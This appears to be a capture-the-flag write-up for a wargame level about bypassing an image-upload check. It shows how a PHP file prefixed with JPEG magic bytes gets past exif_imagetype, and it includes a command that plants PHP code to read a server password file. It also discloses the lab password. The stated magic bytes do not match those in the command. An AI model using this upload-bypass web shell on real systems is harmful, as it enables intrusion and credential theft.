# Writeup level 13
Very similar to level 12 except that they have built a little check to see if it is an actual jpg.  

```php
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
    
    $err=$_FILES['uploadedfile']['error'];
    if($err){
        if($err === 2){
            echo "The uploaded file exceeds MAX_FILE_SIZE";
        } else{
            echo "Something went wrong :/";
        }
    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }

```

As we can see they use the function **exif_imagetype** to check if it is an jpg. The problem for them is that exif_imagetype only checks the first couple of bytes (magic bytes) to determine what type it is.  

**Exploit**

- Check what are the magic bytes for jpg
- Put them in a file called myjpg.php
- Append php code from level 12 to it
- Upload the file the same way we did in level 12

jpg magic bytes are: FF D8 FF DB  
```
echo -n -e '\xFF\xD8\xFF\xEE' > myjpg.php;echo '<?php $command = exec("cat /etc/natas_webpass/natas14"); echo $command; ?>' >> myjpg.php
```

The password is:  
Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1

